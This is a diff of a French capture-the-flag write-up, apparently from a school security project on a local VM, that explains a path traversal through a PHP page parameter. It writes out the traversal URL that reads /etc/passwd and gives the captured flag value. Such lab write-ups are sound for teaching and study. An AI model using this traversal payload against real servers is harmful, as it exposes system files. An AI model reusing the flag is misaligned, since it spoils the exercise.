@@ -2,7 +2,7 @@
 
 
 ## URL
-
+`http://localhost:4242/?page=media&src=nsa`
 
 ## Description
 
@@ -52,17 +52,20 @@ include($page . '.php');
 
 C'est en manipulant le paramètre `page` de l'url que nous pouvons accéder à un fichier hors du répertoire www du serveur web.
 
-En modifiant le chemin avec `../` nous avons pu voir les messages suivants :
-"Still nope"
-"Wrong again"
+En modifiant le chemin avec `?page=../`, en reculant d'un repertoire a chaque fois, nous avons pu voir les messages suivants :
+"Wtf ?"
+"Wrong.."
+"Nope..
+"Almost."
+"Still nope.."
+"Nope..
 "You can DO it !!! :]"
 
 ```
-/?page=../../../../../../../etc/passwd
+http://localhost:4242/?page=../../../../../../../etc/passwd
 ```
+`Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 `
 
 Le contenu de /etc/passwd est révélé, le flag apparait dans une alerte JS.
 
 Ceci explique la raison pour laquelle le projet se fait dans une VM :D.
-
-## Déchiffrer le flag
